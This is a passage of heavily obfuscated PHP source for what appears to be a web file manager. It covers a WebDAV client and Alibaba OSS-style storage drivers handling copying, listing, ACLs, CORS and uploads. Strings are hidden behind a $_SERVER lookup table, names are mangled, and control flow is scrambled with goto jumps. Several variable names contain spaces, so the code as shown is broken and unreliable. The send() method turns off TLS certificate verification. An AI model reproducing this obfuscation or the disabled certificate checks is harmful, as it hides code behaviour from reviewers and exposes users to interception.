$A¾“ä»îÆä); } public function copy($aäöğ‡°ºà, $EÀºæÍî„) { $f±®Í›‹…¥ =& $_SERVER[Ä¿Ş°¨]; $this->setHeader($f±®Í›‹…¥[1727], $this->makePath($EÀºæÍî„)); $this->setHeader($f±®Í›‹…¥[1728], $f±®Í›‹…¥[1729]); return $this->send($f±®Í›‹…¥[1732], $aäöğ‡°ºà); } public function mkcol($FÍ¼ŒÏç˜Ğ) { $B‘­ÎÓŠ¬ =& $_SERVER[Ä¿Ş°¨]; $this->setHeader($B‘­ÎÓŠ¬[1728], $B‘­ÎÓŠ¬[1729]); return $this->send($B‘­ÎÓŠ¬[1733], $FÍ¼ŒÏç˜Ğ); } public function delete($aùÂ«ÜÌôˆ, $DëÈ…š¹º = '') { $aé—áÈ‚èè =& $_SERVER[Ä¿Ş°¨]; if ($DëÈ…š¹º) { $this->setHeader($aé—áÈ‚èè[1730], $aé—áÈ‚èè[912] . $DëÈ…š¹º . $aé—áÈ‚èè[915]); } return $this->send($aé—áÈ‚èè[1228], $aùÂ«ÜÌôˆ); } public function propfind($c³Ì¾­Ê‚Ä) { $D‡ÌÌè¯•¥ =& $_SERVER[Ä¿Ş°¨]; $this->setHeader($D‡ÌÌè¯•¥[1734], $D‡ÌÌè¯•¥[83]); $this->setHeader($D‡ÌÌè¯•¥[1735], $D‡ÌÌè¯•¥[1736]); $a“’Š¹® = $D‡ÌÌè¯•¥[1737]; return $this->send($D‡ÌÌè¯•¥[1738], $c³Ì¾­Ê‚Ä, $a“’Š¹®); } public function options($f¦´Œ¿Ş”î) { return $this->send($_SERVER[Ä¿Ş°¨][1739], $f¦´Œ¿Ş”î); } public function get($dœš‡Ëçä) { return $this->send($_SERVER[Ä¿Ş°¨][212], $dœš‡Ëçä); } public function put($E¹£Êã¦òë, $bÖ¬†Ø÷ç—, $bôÔ±Äëñ’ = '') { $DÊ»Èˆï¨‘ =& $_SERVER[Ä¿Ş°¨]; if ($bôÔ±Äëñ’) { $this->setHeader($DÊ»Èˆï¨‘[1730], $DÊ»Èˆï¨‘[912] . $bôÔ±Äëñ’ . $DÊ»Èˆï¨‘[915]); } return $this->send($DÊ»Èˆï¨‘[210], $E¹£Êã¦òë, $bÖ¬†Ø÷ç—); } protected function send($Bòš¤Ó·ãµ, $C‰²ƒ†ëƒ¦, $AÚøĞ ßš = false, $F°Ãï“ë†– = false) { goto A‘Ô“ã¤ù·; D™¥ÚË±Ï¤: $this->header = array(); return $BÊ¨ÕË±Ó; goto D»ö¢Şò°¢; A‘Ô“ã¤ù·: $d§à¡Àö“ =& $_SERVER[Ä¿Ş°¨]; $e••àŒ»Ü = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($d§à¡Àö“[1740], $d§à¡Àö“[50]); goto c”å·±›Ä; EÂÕ—„Ì…: curl_setopt($C­›‘áËÃá, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($C­›‘áËÃá, CURLOPT_SSL_VERIFYHOST, !1); $BÊ¨ÕË±Ó = curl_exec($C­›‘áËÃá); goto D™¥ÚË±Ï¤; fßÁ¡ò‹îã: curl_setopt($C­›‘áËÃá, CURLOPT_HTTPHEADER, $this->header); curl_setopt($C­›‘áËÃá, CURLOPT_RETURNTRANSFER, !0); curl_setopt($C­›‘áËÃá, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto EÂÕ—„Ì…; bñ¾³¶œ§Ñ: $C­›‘áËÃá = curl_init($C‰²ƒ†ëƒ¦); curl_setopt($C­›‘áËÃá, CURLOPT_CUSTOMREQUEST, $Bòš¤Ó·ãµ); curl_setopt($C­›‘áËÃá, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto fßÁ¡ò‹îã; c”å·±›Ä: $this->setHeader($e••àŒ»Ü); if ($AÚøĞ ßš) { $AÚøĞ ßš = $d§à¡Àö“[1741] . $AÚøĞ ßš; } if (!request_url_safe($C‰²ƒ†ëƒ¦)) { return !1; } goto bñ¾³¶œ§Ñ; D»ö¢Şò°¢: } } goto DïÙ³„ÂÉ; AØÛ°ÀäĞ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($F®ÂÃ‚¹½) { parent::__construct($F®ÂÃ‚¹½); $this->signatureVersion($_SERVER[Ä¿Ş°¨][196]); } public function fileOutLink($E‡Ş¾–¬ÍÓ) { $f–äÅÇªíà =& $_SERVER[Ä¿Ş°¨]; if (substr($E‡Ş¾–¬ÍÓ, 0, 7) == $f–äÅÇªíà[1093]) { $E‡Ş¾–¬ÍÓ = $f–äÅÇªíà[1094] . substr($E‡Ş¾–¬ÍÓ, 7); } header($f–äÅÇªíà[152] . $E‡Ş¾–¬ÍÓ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($D²‰–Õ£¦) { parent::__construct(); include_once SDK_DIR . $_SERVER[Ä¿Ş°¨][1148]; $this->_init($D²‰–Õ£¦); } public function _init($fÑÏÉÕØ) { foreach ($fÑÏÉÕØ as $F­ÙÍ—²íµ => $aá¿Ğº­) { if (isset($this->{$F­ÙÍ—²íµ})) { $this->{$F­ÙÍ—²íµ} = $aá¿Ğº­; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Ä¿Ş°¨][1149], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto e·çÁ«¼; d‚¤„ãµ¦É: $B—Ûùìö°->addAllowedMethod($A”Ñõ¼‹Ùè[1153]); $B—Ûùìö°->addAllowedMethod($A”Ñõ¼‹Ùè[1154]); $B—Ûùìö°->addAllowedMethod($A”Ñõ¼‹Ùè[151]); goto C„î‹’¢Âİ; e·çÁ«¼: $A”Ñõ¼‹Ùè =& $_SERVER[Ä¿Ş°¨]; $Eêíšèäã¹ = new OSS\Model\CorsConfig(); $B—Ûùìö° = new OSS\Model\CorsRule(); goto fŞåî¤´÷; E¥ŸÈÍÜ‘†: $Eêíšèäã¹->addRule($B—Ûùìö°); try { $this->client->putBucketCors($this->bucket, $Eêíšèäã¹); } catch (OSS\Core\OssException $Dš… ±ö—Õ) { return !1; } return !0; goto B°•Ò‚–Şã; C„î‹’¢Âİ: $B—Ûùìö°->setMaxAgeSeconds(600); $B—Ûùìö°->addExposeHeader($A”Ñõ¼‹Ùè[1155]); $B—Ûùìö°->addAllowedHeader($A”Ñõ¼‹Ùè[1150]); goto E¥ŸÈÍÜ‘†; fŞåî¤´÷: $B—Ûùìö°->addAllowedOrigin($A”Ñõ¼‹Ùè[1150]); $B—Ûùìö°->addAllowedMethod($A”Ñõ¼‹Ùè[1151]); $B—Ûùìö°->addAllowedMethod($A”Ñõ¼‹Ùè[1152]); goto d‚¤„ãµ¦É; B°•Ò‚–Şã: } public function getBucketCors() { goto f§âÇ›¨¡¦; Càì‚‚İ’Ş: $AĞ™¦¾ŸÍõ = $cãÂ…„ªïˆ[0]->getMaxAgeSeconds(); $DÛ¨Ê…ŒªØ = $cãÂ…„ªïˆ[0]->getExposeHeaders(); $b©ŠÛâ©øë = $cãÂ…„ªïˆ[0]->getAllowedHeaders(); goto cßÅõ‚¾µ; f§âÇ›¨¡¦: $d–’«ä‘˜Ë =& $_SERVER[Ä¿Ş°¨]; $c‡ÓÏç¡Ê§ = null; try { $c‡ÓÏç¡Ê§ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $D¢»ÔöÙö ) { return null; } goto FµÒ‰Şê°; FµÒ‰Şê°: if (!$c‡ÓÏç¡Ê§ || !($cãÂ…„ªïˆ = $c‡ÓÏç¡Ê§->getRules())) { return null; } $aøöÀ¥ÚâÍ = $cãÂ…„ªïˆ[0]->getAllowedOrigins(); $FµÃéÀ†¡ = $cãÂ…„ªïˆ[0]->getAllowedMethods(); goto Càì‚‚İ’Ş; cßÅõ‚¾µ: return array($d–’«ä‘˜Ë[171] => isset($aøöÀ¥ÚâÍ[0]) ? $aøöÀ¥ÚâÍ[0] : $d–’«ä‘˜Ë[33], $d–’«ä‘˜Ë[175] => $FµÃéÀ†¡, $d–’«ä‘˜Ë[1156] => $AĞ™¦¾ŸÍõ, $d–’«ä‘˜Ë[1157] => isset($DÛ¨Ê…ŒªØ[0]) ? $DÛ¨Ê…ŒªØ[0] : $d–’«ä‘˜Ë[33], $d–’«ä‘˜Ë[173] => isset($b©ŠÛâ©øë[0]) ? $b©ŠÛâ©øë[0] : $d–’«ä‘˜Ë[33]); goto F†»Š˜±£Ş; F†»Š˜±£Ş: } public function isBucketCors() { goto a»¥æÔÏõ; D„ª†Œ¨”ó: if ($CÚ…µŠÜø[$eòíÃ²ç£†[171]] != $eòíÃ²ç£†[172] || $CÚ…µŠÜø[$eòíÃ²ç£†[173]] != $eòíÃ²ç£†[172]) { return !1; } $F‚Š»ÜÎ•Ğ = array_map($eòíÃ²ç£†[174], $CÚ…µŠÜø[$eòíÃ²ç£†[175]]); if (!is_array($F‚Š»ÜÎ•Ğ)) { $F‚Š»ÜÎ•Ğ = array(); } goto f˜ç˜„Ë›; a»¥æÔÏõ: $eòíÃ²ç£† =& $_SERVER[Ä¿Ş°¨]; $CÚ…µŠÜø = $this->getBucketCors(); if (!$CÚ…µŠÜø || !is_array($CÚ…µŠÜø)) { return !1; } goto D„ª†Œ¨”ó; f˜ç˜„Ë›: $EâÈÅÜáğá = array($eòíÃ²ç£†[176], $eòíÃ²ç£†[177], $eòíÃ²ç£†[178], $eòíÃ²ç£†[179], $eòíÃ²ç£†[180]); $eøŠä³„Ÿå = array_diff($EâÈÅÜáğá, $F‚Š»ÜÎ•Ğ); return empty($eøŠä³„Ÿå); goto bØÒ—Âª; bØÒ—Âª: } public function mkfile($eÇËÉŠ†ˆğ, $f®¦ĞƒóÈÛ = '', $BÉ¬ÍñÂª = REPEAT_RENAME) { $CÃ‹Ê¤âŞ• = $this->setContent($eÇËÉŠ†ˆğ, $f®¦ĞƒóÈÛ); if ($CÃ‹Ê¤âŞ• !== !1) { return $this->getPathOuter($eÇËÉŠ†ˆğ); } return !1; } public function mkdir($aö…‡Ä£°İ, $f´®õËî¶ø = REPEAT_SKIP) { if ($this->_isFolder($aö…‡Ä£°İ)) { return $this->getPathOuter($aö…‡Ä£°İ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($aö…‡Ä£°İ)); } catch (OSS\Core\OssException $A÷˜î†„¶í) { return !1; } return $this->getPathOuter($aö…‡Ä£°İ); } private function fileList($BÃ¹ƒ—Š, $FŸ‹Æ•Ğ—· = '', $câİºï¸Ğà = 0) { goto f¼©¨‹èÎÌ; f¼©¨‹èÎÌ: $FÅ¹¦ßÂù =& $_SERVER[Ä¿Ş°¨]; $BÃ¹ƒ—Š = trim($BÃ¹ƒ—Š, $FÅ¹¦ßÂù[8]); $Aä«Ï«õ‹é = empty($BÃ¹ƒ—Š) ? $FÅ¹¦ßÂù[33] : $BÃ¹ƒ—Š . $FÅ¹¦ßÂù[8]; goto DŸ·ÇƒÑ¢÷; DŸ·ÇƒÑ¢÷: $Cô‰¬À’°Ì = $FÅ¹¦ßÂù[33]; $Eµ£•ª¬¥ = 1000; $BÚâ‡´Îó = $Cğ®ùÜˆÈƒ = array(); goto bàÃ™Š‚ö‰; bàÃ™Š‚ö‰: while (!0) { $C˜ÁÁÊÒ = array($FÅ¹¦ßÂù[1158] => $FŸ‹Æ•Ğ—·, $FÅ¹¦ßÂù[182] => $Aä«Ï«õ‹é, $FÅ¹¦ßÂù[1159] => $Eµ£•ª¬¥, $FÅ¹¦ßÂù[1160] => $Cô‰¬À’°Ì); try { $aºÖ°¿ä„¶ = $this->client->listObjects($this->bucket, $C˜ÁÁÊÒ); } catch (OSS\Core\OssException $eÑéÍ©í´) { break; } $Cô‰¬À’°Ì = $aºÖ°¿ä„¶->getNextMarker(); $Dó¡ùõÍ—Ç = $aºÖ°¿ä„¶->getObjectList(); $c›òÕáùŒ¢ = $aºÖ°¿ä„¶->getPrefixList(); foreach ($Dó¡ùõÍ—Ç as $eé¬Ø“·ÏÖ) { if ($eé¬Ø“·ÏÖ->getKey() == $Aä«Ï«õ‹é) { continue; } $CÌ²¾À÷ˆ… = $eé¬Ø“·ÏÖ->getKey(); if ($câİºï¸Ğà) { $CÌ²¾À÷ˆ… = array($FÅ¹¦ßÂù[28] => $CÌ²¾À÷ˆ…, $FÅ¹¦ßÂù[77] => $eé¬Ø“·ÏÖ->getSize(), $FÅ¹¦ßÂù[186] => strtotime($eé¬Ø“·ÏÖ->getLastModified())); } $Cğ®ùÜˆÈƒ[] = $CÌ²¾À÷ˆ…; } foreach ($c›òÕáùŒ¢ as $Eà©ßØÀÇ¡) { $BÚâ‡´Îó[] = $Eà©ßØÀÇ¡->getPrefix(); } if ($Cô‰¬À’°Ì === $FÅ¹¦ßÂù[33]) { break; } } return array($FÅ¹¦ßÂù[74] => $BÚâ‡´Îó, $FÅ¹¦ßÂù[73] => $Cğ®ùÜˆÈƒ); goto E…İø¼è¡š; E…İø¼è¡š: } public function copyFile($eäÄ„¿õ©Ş, $EÂ…„Æ”É˜) { $aÈÙ—ª Òä = $this->size($eäÄ„¿õ©Ş); if ($aÈÙ—ª Òä < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $eäÄ„¿õ©Ş, $this->bucket, $this->pathEncode($EÂ…„Æ”É˜)); } catch (OSS\Core\OssException $C²Ï°ñ‰ é) { return !1; } return !0; } return $this->multiCopyObject($eäÄ„¿õ©Ş, $EÂ…„Æ”É˜, $aÈÙ—ª Òä); } private function multiCopyObject($f—‹­™ÛŒ , $FÃ¾ªæÖ¦, $b«‘ºáê¼­) { $aÍà‹‡è¬ =& $_SERVER[Ä¿Ş°¨]; try { goto a§¼­Æ«§; DõàÕ³Ú›: $Bšİ¥µÔí = array(); foreach ($dê‹‡ä¨½ô as $D±è•¬¹Ë => $B†í¾öŒÇ¿) { $Bšİ¥µÔí[] = array($aÍà‹‡è¬[1165] => $D±è•¬¹Ë + 1, $aÍà‹‡è¬[1166] => $B†í¾öŒÇ¿); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($FÃ¾ªæÖ¦), $e†‰†Ğô„, $Bšİ¥µÔí); goto Bóßò­ï¸“; a§¼­Æ«§: $b¿ÆÜŠƒÌÖ = array(); if ($b“Ø°õ¹›” = $this->hashMd5($f—‹­™ÛŒ )) { $b¿ÆÜŠƒÌÖ = array(OSS\OssClient::OSS_HEADERS => array($aÍà‹‡è¬[1161] => $b“Ø°õ¹›”)); } $e†‰†Ğô„ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($FÃ¾ªæÖ¦), $b¿ÆÜŠƒÌÖ); goto CÖ„Œ‚Ì; CÖ„Œ‚Ì: $eï‹ßË©¢Ù = 1; $C‰¶ÛÛ›ƒÍ = 0; $dê‹‡ä¨½ô = array(); goto c‹†ÔÄÂâ; c‹†ÔÄÂâ: $aÙ¦ôÓ—Š° = 1024 * 1024 * 10; $D›‹¤ˆáó = $this->client->generateMultiuploadParts($b«‘ºáê¼­, $aÙ¦ôÓ—Š°); foreach ($D›‹¤ˆáó as $D±è•¬¹Ë => $C“§†ã¼ºÂ) { $eí£èÕÓŒ = $C‰¶ÛÛ›ƒÍ + (int) $C“§†ã¼ºÂ[$aÍà‹‡è¬[1162]]; $e¶Ÿ…Áò¤ = (int) $C“§†ã¼ºÂ[$aÍà‹‡è¬[321]] + $eí£èÕÓŒ - 1; $f‚È³•¢ˆ = array($aÍà‹‡è¬[1163] => $eí£èÕÓŒ, $aÍà‹‡è¬[1164] => $e¶Ÿ…Áò¤); $dê‹‡ä¨½ô[] = $this->client->uploadPartCopy($this->bucket, $f—‹­™ÛŒ , $this->bucket, $this->pathEncode($FÃ¾ªæÖ¦), $eï‹ßË©¢Ù, $e†‰†Ğô„, $f‚È³•¢ˆ); $eï‹ßË©¢Ù = $eï‹ßË©¢Ù + 1; } goto DõàÕ³Ú›; Bóßò­ï¸“: } catch (OSS\Core\OssException $fÊ‹·²Ó©) { return !1; } return !0; } public function moveFile($c‡‹ñô±Ú†, $CöàÂ£·‹¥) { if ($this->copyFile($c‡‹ñô±Ú†, $CöàÂ£·‹¥)) { $this->remove($c‡‹ñô±Ú†); return !0; } return !1; } public function delFile($Eà¼ØÉÍÎÈ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Eà¼ØÉÍÎÈ)); } catch (OSS\Core\OssException $B§‹É¿‹‹‹) { return !1; } return !0; } public function delFolder($aÖáö¿›·‚) { $DãßìÖÎù =& $_SERVER[Ä¿Ş°¨]; $aº‡§¤£…³ = $this->fileList($aÖáö¿›·‚); if (!empty($aÖáö¿›·‚) && !in_array(trim($aÖáö¿›·‚, $DãßìÖÎù[8]) . $DãßìÖÎù[8], $aº‡§¤£…³[$DãßìÖÎù[73]])) { $aº‡§¤£…³[$DãßìÖÎù[73]][] = trim($aÖáö¿›·‚, $DãßìÖÎù[8]) . $DãßìÖÎù[8]; } foreach (array_chunk($aº‡§¤£…³[$DãßìÖÎù[73]], 1000) as $F¶¥¥ÀáÖ) { try { $this->client->deleteObjects($this->bucket, $F¶¥¥ÀáÖ); } catch (OSS\Core\OssException $a†Ğ¯Ş„˜Õ) { continue; } } return !0; } public function rename($f‡òÔØ‚¼¼, $e£ñš©÷Ë) { return $this->renameObject($f‡òÔØ‚¼¼, $e£ñš©÷Ë); } private function fileInfo($AÃòñÂ»›˜, $A”ïÜ®¯·Í = array()) { goto b¬Ö¤ˆª×°; EÖ©ˆÌæé¢: return $aáí±ƒ¸ğ¿; goto d®¹Ò‚—¯Ç; EØ¶âÂ¾›˜: if (isset($A”ïÜ®¯·Í[$f‚—ØÛ¹[77]])) { $aáí±ƒ¸ğ¿[$f‚—ØÛ¹[77]] = $A”ïÜ®¯·Í[$f‚—ØÛ¹[77]]; } if (isset($A”ïÜ®¯·Í[$f‚—ØÛ¹[106]])) { $aáí±ƒ¸ğ¿[$f‚—ØÛ¹[106]] = $A”ïÜ®¯·Í[$f‚—ØÛ¹[106]]; } if (isset($A”ïÜ®¯·Í[$f‚—ØÛ¹[186]]) && !trim($aáí±ƒ¸ğ¿[$f‚—ØÛ¹[106]])) { $aáí±ƒ¸ğ¿[$f‚—ØÛ¹[106]] = $A”ïÜ®¯·Í[$f‚—ØÛ¹[186]]; } goto EÖ©ˆÌæé¢; b¬Ö¤ˆª×°: $f‚—ØÛ¹ =& $_SERVER[Ä¿Ş°¨]; $aáí±ƒ¸ğ¿ = array($f‚—ØÛ¹[28] => $this->pathThis($AÃòñÂ»›˜), $f‚—ØÛ¹[75] => $this->getPathOuter($AÃòñÂ»›˜), $f‚—ØÛ¹[29] => $f‚—ØÛ¹[163], $f‚—ØÛ¹[183] => 0, $f‚—ØÛ¹[106] => 0, $f‚—ØÛ¹[77] => 0, $f‚—ØÛ¹[156] => $this->ext($AÃòñÂ»›˜), $f‚—ØÛ¹[184] => !0, $f‚—ØÛ¹[185] => !0); if (empty($A”ïÜ®¯·Í)) { $E¨Ä¸°æÚ = $this->objectMeta($AÃòñÂ»›˜); if (!$E¨Ä¸°æÚ) { return $aáí±ƒ¸ğ¿; } $A”ïÜ®¯·Í = array($f‚—ØÛ¹[106] => strtotime($E¨Ä¸°æÚ[$f‚—ØÛ¹[1167]]), $f‚—ØÛ¹[77] => $E¨Ä¸°æÚ[$f‚—ØÛ¹[1168]] + 0); } goto EØ¶âÂ¾›˜; d®¹Ò‚—¯Ç: } private function folderInfo($F„™™Ê¸ï¹, $aõ¹²¼ÅŠ² = array()) { $B²ã²‹¢×½ =& $_SERVER[Ä¿Ş°¨]; $Bé ¼¶ÓÕ¢ = array($B²ã²‹¢×½[28] => $this->pathThis($F„™™Ê¸ï¹), $B²ã²‹¢×½[75] => $this->getPathOuter($B²ã²‹¢×½[8] . $F„™™Ê¸ï¹), $B²ã²‹¢×½[29] => $B²ã²‹¢×½[76], $B²ã²‹¢×½[183] => 0, $B²ã²‹¢×½[106] => 0, $B²ã²‹¢×½[184] => !0, $B²ã²‹¢×½[185] => !0); if (empty($aõ¹²¼ÅŠ²)) { $F„™™Ê¸ï¹ = rtrim($F„™™Ê¸ï¹, $B²ã²‹¢×½[8]) . $B²ã²‹¢×½[8]; $f‘¦°Ø‹ù = $this->objectMeta($F„™™Ê¸ï¹); if (!$f‘¦°Ø‹ù) { return $Bé ¼¶ÓÕ¢; } $aõ¹²¼ÅŠ² = array($B²ã²‹¢×½[183] => $f‘¦°Ø‹ù[$B²ã²‹¢×½[1169]][$B²ã²‹¢×½[1170]], $B²ã²‹¢×½[106] => strtotime($f‘¦°Ø‹ù[$B²ã²‹¢×½[1167]])); } if (isset($aõ¹²¼ÅŠ²[$B²ã²‹¢×½[106]])) { $Bé ¼¶ÓÕ¢[$B²ã²‹¢×½[106]] = $aõ¹²¼ÅŠ²[$B²ã²‹¢×½[106]]; } if (isset($aõ¹²¼ÅŠ²[$B²ã²‹¢×½[183]])) { $Bé ¼¶ÓÕ¢[$B²ã²‹¢×½[183]] = $aõ¹²¼ÅŠ²[$B²ã²‹¢×½[183]]; } return $Bé ¼¶ÓÕ¢; } public function listPath($CæØ¸Œ¬‚, $e²ŞÆÍ‹—‰ = false) { $E‚ˆŸÔÍç… =& $_SERVER[Ä¿Ş°¨]; $AßÚ¹¯ŸÁè = $this->fileList($CæØ¸Œ¬‚, $E‚ˆŸÔÍç…[8], !0); foreach ($AßÚ¹¯ŸÁè[$E‚ˆŸÔÍç…[74]] as $A…Ä™‡¥š => $Eì ½°ìç†) { $AßÚ¹¯ŸÁè[$E‚ˆŸÔÍç…[74]][$A…Ä™‡¥š] = $this->folderInfo($Eì ½°ìç†, $Eì ½°ìç†); } foreach ($AßÚ¹¯ŸÁè[$E‚ˆŸÔÍç…[73]] as $A…Ä™‡¥š => $Eì ½°ìç†) { $AßÚ¹¯ŸÁè[$E‚ˆŸÔÍç…[73]][$A…Ä™‡¥š] = $this->fileInfo($Eì ½°ìç†[$E‚ˆŸÔÍç…[28]], $Eì ½°ìç†); } return $AßÚ¹¯ŸÁè; } public function has($Dƒ±¢¨·è¨, $c™åÚ­‘Šä = false, $D¶ÒÅ¸ÊÔ = true) { goto EÑÆæø‚µ; a‡æ’çó‰›: return !1; goto EòÑ Ü§µ; EÍÄÖ×ï¨: $aÙŠ…¯˜‰ó = $d¾°š¯ôŸ[33]; $b¿»Ïö‘Â = 500; $Cƒ©œÉĞÏ = 0; goto d‚¸ç½Öô÷; EÑÆæø‚µ: $d¾°š¯ôŸ =& $_SERVER[Ä¿Ş°¨]; $Dƒ±¢¨·è¨ = trim($Dƒ±¢¨·è¨, $d¾°š¯ôŸ[8]); $D°ˆŠ¦éİæ = empty($Dƒ±¢¨·è¨) ? $d¾°š¯ôŸ[33] : $Dƒ±¢¨·è¨ . $d¾°š¯ôŸ[8]; goto EÍÄÖ×ï¨; d‚¸ç½Öô÷: $F¦º·ÑÔÇ = 0; while (!0) { $f³ĞÖ±Ü = array($d¾°š¯ôŸ[1158] => $d¾°š¯ôŸ[8], $d¾°š¯ôŸ[182] => $D°ˆŠ¦éİæ, $d¾°š¯ôŸ[1159] => $b¿»Ïö‘Â, $d¾°š¯ôŸ[1160] => $aÙŠ…¯˜‰ó); try { $DÂæÇŠ”äó = $this->client->listObjects($this->bucket, $f³ĞÖ±Ü); } catch (OSS\Core\OssException $f«×È«‘˜) { break; } $aÙŠ…¯˜‰ó = $DÂæÇŠ”äó->getNextMarker(); $a³¶Ú…Ş•ğ = $DÂæÇŠ”äó->getObjectList(); $Cá¼ÚÂ¥¸ = $DÂæÇŠ”äó->getPrefixList(); if ($c™åÚ­‘Šä) { if (count($a³¶Ú…Ş•ğ) > 1 || count($a³¶Ú…Ş•ğ) == 1 && $a³¶Ú…Ş•ğ[0]->getKey() != $D°ˆŠ¦éİæ) { $Cƒ©œÉĞÏ += count($a³¶Ú…Ş•ğ) - 1; } if (!empty($Cá¼ÚÂ¥¸)) { $F¦º·ÑÔÇ += count($Cá¼ÚÂ¥¸); } if ($aÙŠ…¯˜‰ó === $d¾°š¯ôŸ[33]) { break; } continue; } if ($D¶ÒÅ¸ÊÔ) { if (!empty($a³¶Ú…Ş•ğ)) { if (count($a³¶Ú…Ş•ğ) > 1 || $a³¶Ú…Ş•ğ[0]->getKey() != $D°ˆŠ¦éİæ) { return !0; } } } else { if (!empty($Cá¼ÚÂ¥¸)) { return !0; } } if ($aÙŠ…¯˜‰ó === $d¾°š¯ôŸ[33]) { break; } } if ($c™åÚ­‘Šä) { return array($d¾°š¯ôŸ[187] => $Cƒ©œÉĞÏ, $d¾°š¯ôŸ[188] => $F¦º·ÑÔÇ); } goto a‡æ’çó‰›; EòÑ Ü§µ: } public function listAll($E¢¬œî•ª°) { $aá¸­¾â” =& $_SERVER[Ä¿Ş°¨]; $dŸß†ù¢ = $this->fileList($E¢¬œî•ª°, $aá¸­¾â”[33], !0); $f‰ÏÚÏ‚• = array(); foreach ($dŸß†ù¢[$aá¸­¾â”[73]] as $b®‹¬‚Û˜Ÿ) { $f‰ÏÚÏ‚•[$b®‹¬‚Û˜Ÿ[$aá¸­¾â”[28]]] = $b®‹¬‚Û˜Ÿ[$aá¸­¾â”[77]]; } return $this->listAllFiles($E¢¬œî•ª°, array_keys($f‰ÏÚÏ‚•), $f‰ÏÚÏ‚•); } public function canRead($EÙŸÄéè‰Ó) { $b¨ƒÃºîÄÂ =& $_SERVER[Ä¿Ş°¨]; $c‘ÔÊØöö = $this->pathAcl($EÙŸÄéè‰Ó); return $c‘ÔÊØöö == $b¨ƒÃºîÄÂ[1171] || $c‘ÔÊØöö == $b¨ƒÃºîÄÂ[495] ? !0 : !1; } public function canWrite($Aˆ•†¿Óâğ) { $dºÖó‚É§Ô = $this->pathAcl($Aˆ•†¿Óâğ); return $dºÖó‚É§Ô == $_SERVER[Ä¿Ş°¨][495] ? !0 : !1; } public function pathAcl($d ‹Á‘Š¥Ù) { goto Dö™ƒÛïã; aÌ„”İ¸: $f„šãæÙİ¤ = $Fáóõì½½Ô == $C¿ñ÷¥…Û¿[34] ? $this->bucketAcl : $Fáóõì½½Ô; if ($f„šãæÙİ¤ == $C¿ñ÷¥…Û¿[1172]) { return $C¿ñ÷¥…Û¿[1171]; } if ($f„šãæÙİ¤ == $C¿ñ÷¥…Û¿[1173]) { return $C¿ñ÷¥…Û¿[495]; } goto a¥ˆ‹¤ËÛ’; Dö™ƒÛïã: $C¿ñ÷¥…Û¿ =& $_SERVER[Ä¿Ş°¨]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Fáóõì½½Ô = $this->client->getObjectAcl($this->bucket, $this->pathEncode($d ‹Á‘Š¥Ù)); } catch (OSS\Core\OssException $cß–ìŠ×¾ï) { return !1; } goto aÌ„”İ¸; a¥ˆ‹¤ËÛ’: return $f„šãæÙİ¤; goto Aè›˜³Ø¹; Aè›˜³Ø¹: } private function chmodPath($AêˆÍˆäñ, $FÖÕµ–İöã = '') { $bÇ±½©°± =& $_SERVER[Ä¿Ş°¨]; $aòŠÈìæä‹ = empty($FÖÕµ–İöã) ? $bÇ±½©°±[1173] : $FÖÕµ–İöã; $d¸‚¡Ö½ = array($bÇ±½©°±[34], $bÇ±½©°±[181], $bÇ±½©°±[1172], $bÇ±½©°±[1173]); if (!in_array($aòŠÈìæä‹, $d¸‚¡Ö½)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($AêˆÍˆäñ), $aòŠÈìæä‹); } catch (OSS\Core\OssException $d“ƒÅ‚§ŸÖ) { return !1; } return !0; } public function getContent($Eİ§Ê‹’ª) { return $this->fileSubstr($Eİ§Ê‹’ª, -1); } public function setContent($CòåÇŠé‚, $d´ªÜï×†» = '') { $eÉŞšæ¹ç =& $_SERVER[Ä¿Ş°¨]; try { $Fíö‰Ä¯—§ = $this->trafficLimit($eÉŞšæ¹ç[1174]); $aåÚµ¢•Ğ³ = $this->client->putObject($this->bucket, $this->pathEncode($CòåÇŠé‚), $d´ªÜï×†», $Fíö‰Ä¯—§); } catch (OSS\Core\OssException $a¡¹¨’ÃãÖ) { return !1; } $A¥–áîÕà = array($eÉŞšæ¹ç[1161] => trim($aåÚµ¢•Ğ³[$eÉŞšæ¹ç[1175]], $eÉŞšæ¹ç[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($CòåÇŠé‚))); $this->updateObjMeta($CòåÇŠé‚, $A¥–áîÕà); return isset($aåÚµ¢•Ğ³[$eÉŞšæ¹ç[1176]][$eÉŞšæ¹ç[1123]]) ? (int) $aåÚµ¢•Ğ³[$eÉŞšæ¹ç[1176]][$eÉŞšæ¹ç[1123]] : strlen($aåÚµ¢•Ğ³); } private function updateObjMeta($EÊçº¸ˆ•, $d¿¾òĞÈ‰Ú) { $EÊçº¸ˆ• = $this->pathEncode($EÊçº¸ˆ•); try { $Dö–‘¼œÄ¿ = array(OSS\OssClient::OSS_HEADERS => $d¿¾òĞÈ‰Ú); $this->client->copyObject($this->bucket, $EÊçº¸ˆ•, $this->bucket, $EÊçº¸ˆ•, $Dö–‘¼œÄ¿); } catch (OSS\Core\OssException $d¨ï‘œ•¸) { return !1; } return !0; } public function upload($a‡›•³Äº¬, $C‚ÛßØ•«å, $Bõ¸İŒ²É = false, $fÖêœ„ÀÀ = REPEAT_REPLACE) { $fèˆµŠÃí¿ =& $_SERVER[Ä¿Ş°¨]; $dÑã×•âô = trim($a‡›•³Äº¬, $fèˆµŠÃí¿[8]); 